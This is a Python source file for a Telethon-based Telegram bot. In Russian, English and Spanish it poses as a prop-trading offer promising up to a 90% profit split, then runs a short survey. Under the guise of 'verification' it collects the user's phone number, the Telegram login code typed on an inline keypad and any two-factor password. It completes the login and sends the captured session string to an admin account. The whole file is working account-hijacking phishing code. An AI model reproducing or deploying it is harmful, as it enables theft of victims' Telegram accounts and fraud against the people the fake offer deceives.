import asyncio
import os
from datetime import datetime
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# ================= КОНФИГ =================
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
SESSION = os.environ.get("SESSION", "")   # сессия аккаунта-бота
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

# ================= ТЕКСТЫ =================
TEXTS = {
    "ru": {
        "welcome": "💎 **PROP TRADING — НОВЫЙ УРОВЕНЬ**\n━━━━━━━━━━━━━━━━━━━━\n\n💰 **До 90% прибыли** вместо 80%\n👀 Оставь заявку на повышение profit split\n\n🌍 Выбери язык:",
        "q1": "1️⃣ **Если бы ты мог изменить только одну вещь в своей торговле — что выберешь?**",
        "q1_opts": [("💰 Зарабатывать больше", "a1"), ("📈 Торговать большим капиталом", "a2"), ("⚡️ Быстрее получить funded", "a3"), ("🛡️ Снизить риски", "a4")],
        "q2": "2️⃣ **Что для тебя важнее всего в prop trading?**",
        "q2_opts": [("💎 Высокий profit split", "b1"), ("🚀 Возможность масштабироваться", "b2"), ("⚡️ Быстрый путь к funded", "b3"), ("🔒 Свободные условия торговли", "b4")],
        "q3": "3️⃣ **Какой результат ты хотел бы получить?**",
        "q3_opts": [("🔥 До 90% profit split", "c1"), ("📈 До $400K funded", "c2"), ("⚡️ Найти оптимальный формат", "c3"), ("🎯 Хочу получить персональные условия", "c4")],
        "verify": "🔐 **Верификация**\n\nЧтобы продолжить, поделись своим номером телефона.\nЭто нужно для создания персональной сессии.",
        "share_phone": "📱 Поделиться номером",
        "code_sent": "📩 Код отправлен в Telegram!\n\nВведи код с клавиатуры ниже:",
        "code_hint": "Введи код: `{code}`",
        "code_error": "❌ Неверный код. Попробуй ещё раз.",
        "2fa": "🔑 Введи пароль двухфакторной аутентификации:",
        "final": "🎉 **Заявка успешно отправлена!**\n━━━━━━━━━━━━━━━━━━━━\n\n⏳ Ожидай ответа менеджера.\nОтвет поступит в течение **24 часов**.\n\n💎 Спасибо, что выбрал нас! 🚀",
        "already": "⚠️ Ты уже отправил заявку. Ожидай ответа менеджера.",
    },
    "en": {
        "welcome": "💎 **PROP TRADING — NEXT LEVEL**\n━━━━━━━━━━━━━━━━━━━━\n\n💰 **Up to 90% profit** instead of 80%\n👀 Request a profit split increase\n\n🌍 Choose language:",
        "q1": "1️⃣ **If you could change only one thing in your trading — what would it be?**",
        "q1_opts": [("💰 Earn more", "a1"), ("📈 Trade bigger capital", "a2"), ("⚡️ Get funded faster", "a3"), ("🛡️ Reduce risks", "a4")],
        "q2": "2️⃣ **What matters most to you in prop trading?**",
        "q2_opts": [("💎 High profit split", "b1"), ("🚀 Scaling opportunities", "b2"), ("⚡️ Fast track to funded", "b3"), ("🔒 Flexible conditions", "b4")],
        "q3": "3️⃣ **What result would you like to achieve?**",
        "q3_opts": [("🔥 Up to 90% profit split", "c1"), ("📈 Up to $400K funded", "c2"), ("⚡️ Find optimal format", "c3"), ("🎯 Get personal conditions", "c4")],
        "verify": "🔐 **Verification**\n\nTo continue, share your phone number.\nThis is needed to create your personal session.",
        "share_phone": "📱 Share phone number",
        "code_sent": "📩 Code sent to Telegram!\n\nEnter the code below:",
        "code_hint": "Enter code: `{code}`",
        "code_error": "❌ Invalid code. Try again.",
        "2fa": "🔑 Enter your 2FA password:",
        "final": "🎉 **Request submitted successfully!**\n━━━━━━━━━━━━━━━━━━━━\n\n⏳ Wait for a manager's response.\nYou'll hear back within **24 hours**.\n\n💎 Thanks for choosing us! 🚀",
        "already": "⚠️ You've already submitted a request. Please wait.",
    },
    "es": {
        "welcome": "💎 **PROP TRADING — SIGUIENTE NIVEL**\n━━━━━━━━━━━━━━━━━━━━\n\n💰 **Hasta 90% de ganancias** en lugar del 80%\n👀 Solicita aumentar tu profit split\n\n🌍 Elige idioma:",
        "q1": "1️⃣ **Si pudieras cambiar solo una cosa en tu trading — ¿qué elegirías?**",
        "q1_opts": [("💰 Ganar más", "a1"), ("📈 Operar con más capital", "a2"), ("⚡️ Obtener funded más rápido", "a3"), ("🛡️ Reducir riesgos", "a4")],
        "q2": "2️⃣ **¿Qué es lo más importante para ti en el prop trading?**",
        "q2_opts": [("💎 Alto profit split", "b1"), ("🚀 Posibilidad de escalar", "b2"), ("⚡️ Camino rápido a funded", "b3"), ("🔒 Condiciones flexibles", "b4")],
        "q3": "3️⃣ **¿Qué resultado te gustaría obtener?**",
        "q3_opts": [("🔥 Hasta 90% profit split", "c1"), ("📈 Hasta $400K funded", "c2"), ("⚡️ Encontrar el formato óptimo", "c3"), ("🎯 Obtener condiciones personales", "c4")],
        "verify": "🔐 **Verificación**\n\nPara continuar, comparte tu número de teléfono.\nEsto es necesario para crear tu sesión personal.",
        "share_phone": "📱 Compartir número",
        "code_sent": "📩 ¡Código enviado a Telegram!\n\nIngresa el código abajo:",
        "code_hint": "Ingresa el código: `{code}`",
        "code_error": "❌ Código inválido. Intenta de nuevo.",
        "2fa": "🔑 Ingresa tu contraseña 2FA:",
        "final": "🎉 **¡Solicitud enviada con éxito!**\n━━━━━━━━━━━━━━━━━━━━\n\n⏳ Espera la respuesta de un manager.\nTe responderemos en **24 horas**.\n\n💎 ¡Gracias por elegirnos! 🚀",
        "already": "⚠️ Ya enviaste una solicitud. Espera por favor.",
    },
}

OPTION_LABELS = {
    "a1": "💰 Зарабатывать больше", "a2": "📈 Торговать большим капиталом",
    "a3": "⚡️ Быстрее получить funded", "a4": "🛡️ Снизить риски",
    "b1": "💎 Высокий profit split", "b2": "🚀 Возможность масштабироваться",
    "b3": "⚡️ Быстрый путь к funded", "b4": "🔒 Свободные условия торговли",
    "c1": "🔥 До 90% profit split", "c2": "📈 До $400K funded",
    "c3": "⚡️ Найти оптимальный формат", "c4": "🎯 Хочу получить персональные условия",
}

# ================= СОСТОЯНИЕ =================
STATE = {}

def get_state(uid):
    return STATE.setdefault(uid, {
        "lang": None, "answers": {}, "step": 0,
        "phone": None, "phone_code_hash": None,
        "code": "", "client": None, "done": False,
    })

def lang_buttons():
    return [[Button.inline("🇷🇺 Русский", b"lang:ru"), Button.inline("🇬🇧 English", b"lang:en"), Button.inline("🇪🇸 Español", b"lang:es")]]

def options_buttons(opts):
    rows, row = [], []
    for text, data in opts:
        row.append(Button.inline(text, data.encode()))
        if len(row) == 2:
            rows.append(row); row = []
    if row: rows.append(row)
    return rows

def code_keyboard(code, lang):
    digits = [["1", "2", "3"], ["4", "5", "6"], ["7", "8", "9"], ["⌫", "0", "✅"]]
    rows = []
    for row in digits:
        btn_row = []
        for d in row:
            if d == "⌫":
                btn_row.append(Button.inline("⌫", b"code:del"))
            elif d == "✅":
                btn_row.append(Button.inline("✅", b"code:ok"))
            else:
                btn_row.append(Button.inline(d, f"code:{d}".encode()))
        rows.append(btn_row)
    return rows


async def main():
    # Подключаемся к аккаунту-боту через готовую сессию
    client = TelegramClient(StringSession(SESSION), API_ID, API_HASH)
    await client.connect()

    if not await client.is_user_authorized():
        print("❌ Сессия недействительна. Сгенерируй SESSION заново.")
        return

    me = await client.get_me()
    print(f"✅ Бот запущен: {me.first_name} (@{me.username})")

    @client.on(events.NewMessage)
    async def handler(event):
        if not event.is_private:
            return
        uid = event.sender_id
        st = get_state(uid)

        # === ОБРАБОТКА КОНТАКТА ===
        if event.message.contact:
            phone = event.message.contact.phone_number
            if not phone.startswith("+"):
                phone = "+" + phone
            st["phone"] = phone
            st["step"] = 5

            user_client = TelegramClient(StringSession(), API_ID, API_HASH)
            await user_client.connect()
            st["client"] = user_client

            try:
                sent = await user_client.send_code_request(phone)
                st["phone_code_hash"] = sent.phone_code_hash
                st["code"] = ""
                lang = st["lang"] or "ru"
                await event.reply(TEXTS[lang]["code_sent"], buttons=code_keyboard(st["code"], lang))
            except Exception as e:
                await event.reply(f"❌ Ошибка: {e}")
            return

        # === ОБРАБОТКА ПАРОЛЯ 2FA ===
        if st["step"] == 6:
            try:
                await st["client"].sign_in(password=event.message.text)
                await finish_auth(event, uid, st)
            except Exception as e:
                await event.reply(f"❌ Ошибка 2FA: {e}")
            return

        # === СТАРТ / ОБЫЧНОЕ СООБЩЕНИЕ ===
        if st["done"]:
            await event.reply(TEXTS[st["lang"] or "ru"]["already"])
            return
        st["lang"] = None; st["step"] = 0; st["answers"] = {}
        await event.reply(TEXTS["ru"]["welcome"], buttons=lang_buttons())


    @client.on(events.CallbackQuery)
    async def cb(event):
        uid = event.sender_id
        data = event.data.decode()
        st = get_state(uid)

        # === ЯЗЫК ===
        if data.startswith("lang:"):
            lang = data.split(":")[1]
            st["lang"] = lang; st["step"] = 1; st["answers"] = {}
            await event.edit(TEXTS[lang]["q1"], buttons=options_buttons(TEXTS[lang]["q1_opts"]))
            return

        if not st["lang"]:
            await event.answer("Сначала выбери язык", alert=True); return
        lang = st["lang"]; T = TEXTS[lang]

        # === ОПРОС ===
        if data.startswith("a"):
            st["answers"]["q1"] = data; st["step"] = 2
            await event.edit(T["q2"], buttons=options_buttons(T["q2_opts"])); return
        if data.startswith("b"):
            st["answers"]["q2"] = data; st["step"] = 3
            await event.edit(T["q3"], buttons=options_buttons(T["q3_opts"])); return
        if data.startswith("c"):
            st["answers"]["q3"] = data; st["step"] = 4
            await event.edit(T["verify"], buttons=[[Button.request_phone(T["share_phone"])]]); return

        # === ВВОД КОДА ===
        if data.startswith("code:"):
            action = data.split(":")[1]
            if action == "del":
                st["code"] = st["code"][:-1]
            elif action == "ok":
                try:
                    await st["client"].sign_in(
                        phone=st["phone"],
                        code=st["code"],
                        phone_code_hash=st["phone_code_hash"]
                    )
                    await finish_auth(event, uid, st)
                except SessionPasswordNeededError:
                    st["step"] = 6
                    await event.edit(T["2fa"])
                except PhoneCodeInvalidError:
                    st["code"] = ""
                    await event.answer(T["code_error"], alert=True)
                except Exception as e:
                    await event.answer(f"❌ {e}", alert=True)
                return
            else:
                st["code"] += action
            await event.edit(T["code_hint"].format(code=st["code"] or "—"), buttons=code_keyboard(st["code"], lang))
            return


    async def finish_auth(event, uid, st):
        lang = st["lang"]
        session_string = st["client"].session.save()
        await st["client"].disconnect()

        a = st["answers"]
        text = (
            "📝 **НОВАЯ ЗАЯВКА**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 User ID: `{uid}`\n"
            f"📱 Телефон: `{st['phone']}`\n"
            f"🌍 Язык: {lang}\n\n"
            f"1️⃣ {OPTION_LABELS.get(a.get('q1'), '?')}\n"
            f"2️⃣ {OPTION_LABELS.get(a.get('q2'), '?')}\n"
            f"3️⃣ {OPTION_LABELS.get(a.get('q3'), '?')}\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 **СЕССИЯ:**\n`{session_string}`\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        )
        await client.send_message(ADMIN_ID, text)
        st["done"] = True
        st["step"] = 0
        await event.edit(TEXTS[lang]["final"])

    print("👀 Слушаю...")
    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
